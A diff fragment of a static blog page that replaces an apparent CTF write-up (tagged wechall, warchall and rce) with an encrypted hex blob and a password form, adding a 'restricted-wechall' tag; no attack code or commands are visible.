a6eaf4ba98246a32cbee70c0ce5b462157a798ff2cc5c236dbebbed7e36b233457cf3c008d26d8dff18bd2724b6d7bbed3569e2734b9ddaddcc066cf766a8a29cec7256a073c6010a4d2187a2aca25ac77ce7ade443c64751c4297d1f540cc802ded51faf8034af6e9c1034af48c5e74d67d79ca8c1c38a5a50d7b43837b887b81934f70048e9e4ddab242521d47f853cbefd77363ebd9e611a04550253fd6ffd9a0db6b985a807ffe16a33153f6bd93cb2fc45a82701e410a2e033c373fb9b54737b54c5c60b9a9daa95efd14c428eff96f0808b67bd2e99ecad8e09c7749e6d76f428d0391a0c3693a61037c6ee19a58c03194b7a3071cc66fbd3200f46920df0143799f02695dc493aa26c4574e088d79fb7ebf96df94dbbf603c6e36691d95b3ab4ba8f184e62214a56809e5ae1d2b77a4075f70d17f0893f9fcccacf154db1cb9c8a366a078f17cd9e0161db60de440a7a2321f6a33fad9bc54c24a1bd60e57b240f5aead21e9b6fb7f7ad5ddb8146b03561b94db1672dfbb6151713a96be2507638ef02c25adecc3c2595ee95c9b01db5a066fac1284e1817f5047a7059abe0254c72ea66b242e32d504812fc07e7e6bfc99ec104bc941aa064e45cfa61f563e6d6027ba68df30fb46b8e7677ddefaa6c83641a46afcd36f75be18407dfefc53f0ff52494f8835b30f0a378b9bec9c0991fb606c55407a3299bb1515e81b155d2dad3265c7ab348bf9299b1dab4e2440e3727902c5d645f8c99f50e625faeccc2dccbb05ac842749e0b47b7beec5ecd17ab3529c6a705ee9d8c456932d983cef66f7f1dbe85881bc208f62a493ba69d618c68d8a0a98b7a5d0f7f9b15a9ef5da5f935ff99097532b28effa0613cf634b2e45908faeddc5494260a05221e3e76a4e2a909b040edd56a18903d9c8dc89a554d2cc1d13d53c6ac9cdf6b1799b2d580ac17f9b0e61fa94a91f1729e46befc4c610c762ca5ed76a2dc4d5cdc3725ebac5705ec114016768e629e36c27b24a73d4e849bac1eed145001418c365290f8054e92c63f98c38039434fa50280c74ce0772030e3cad28cd739fc739cca680bb8783e43efda70e571505edc86d5bae5389cdf1bdf887141e3edb86ff14081b6c561b0beae5d12a953d41fe47afe4ec22783cf77074a3b51402fccbd05849f8a12ebfea349bf1d24b7f8179886c7ec57ec3afdccaa2da952dadaa576a7681bcd5522011cd554205c70dcb32cfe61a795a1154ea687420d2ae252c3a0d344bb1d720d5a88047a739351e10b2c5c36af8b9043b25994b1293c8a9d921ad8907a5f706988cce7570c0245400c87ff236e15c72f0955d84a64869f77c19ad9745a9904c77462a0cfff7836226bfbb4c3ab20eed1d97bfa02d3db5e7d0fb7c70f29450d80f173ef42b906ebf6e60fcb6b59c54be3f8060f2d7939b7ae6704e091511ea38ce454f45147f11db6e33a243ea9bd202a51a5530bdc04755b562d6c553972d9811291fbf901d2f1cdf11d6e196c4726456221a8449461f7aa41709a1213608bd705accb6f2e69c6c16ef0df455b58f62238814063cdfa56897baa958718c1d9b91f1a6127aff4557f259e5f7a605a7ee795d6bdfd9be645b0d5334549576bb21010ea50d05e222990b989dcda31a3715239683d8b6b47899ad4de29ea3551c959bfc183ddb9bb32acf3e45e287410dcc3ec8717cf46b705b7cb4b73abcf83f352dafffb89d451e5a52c364de2b0dddf21f9070a9554df5f1c21d26cee66b0a2a01859a15837fcccbffc9b4b5541e014ab1d7171c8756dac5a1ae334421f9810a71d75e2047e530f7c970540d276a234514b7fd471130974c6ccb7d1d462420b85bd094e2ad6e7a27cf39a23830020a99921f6a7020d0913fa609e4e23daf31b2553ae9dcc2e60cf7338ac70dc3c9e0adc661bcb410b5bda3b8ab830e4d290bcebde1da8abb37b9ee14e9539a2913049158f5db01e70dfb90d24b63c8219355aa53ba230308cfd7a03d793a05a668e31d30df60a38f102f64d79a2ba71cc999c76b6db20d184560440ea9dd2c184e08ed60da7ee6662b71cbf055a20b83facd93294887ad14620133c571002e6226a5d1ab4d38b3720409ba93d6b8cb0ca2fe0eb9789c5bec62aa45a136eab465b513786e0c0b86aa9e7a33cc3c113164e526e6af39683a82cf48c20852361d63193524980f84fc56a19b70b33c52973f24ceb7c6c12dc49d664f8f8baeb36209fb86d5f1b2cdd18622b406daa3efee806c235b76b8462ead2c6ba99272446a197611bbf787212e6c9f2d47720d0d81237af49405d2e955afa82998c7737fb31255750e2f31b66d75717fe386af0b7e73ba10a740ae6f322202eaaed8a294f3e0d717c5dadb7e4fa9701c4ef0d2c75af84d7d12d6a448aa0feb60a1ae66d30e72ea4998b28b8b1969f18dfec41ab2131ff0bfb45de992d0947f9b821b47d7f3623dd342d8e5b475f75fab6e82d17b131656326ead4a491245d4963b652d7cc0f432f1e8b0e453be0b9f6efd117cf7e6c113c7127ac1ca9fd39e49a3b28b40d8609eb5161beef7859be978512b8fe2e98ce326182bc2df1507cc940a3c37cf6d89adc52f2213fd588895712868733a41443bddd6b62a93c04a9ac7d746478734ccfda4ca6837a0cd8f4050655ddca50a82bcd4189b6ad1803e78edfab9e980756848931
+  </script>
+  <div class="hbe hbe-content">
+    <form id="hbeForm" class="hbe hbe-form" onsubmit="return false">
+      <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+      <button class="hbe hbe-button" type="submit">Decrypt</button>
+      <div class="hbe hbe-error" role="alert" aria-live="polite"></div>
+    </form>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.51dd9f3b98.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -486,6 +431,7 @@ auto_prepend_file</h4>
           <div class="post-tags">
               <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
               <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/restricted-wechall/" rel="tag"><i class="fa fa-tag"></i> restricted-wechall</a>
               <a href="/tags/wechall/" rel="tag"><i class="fa fa-tag"></i> wechall</a>
               <a href="/tags/warchall/" rel="tag"><i class="fa fa-tag"></i> warchall</a>
               <a href="/tags/rce/" rel="tag"><i class="fa fa-tag"></i> rce</a>
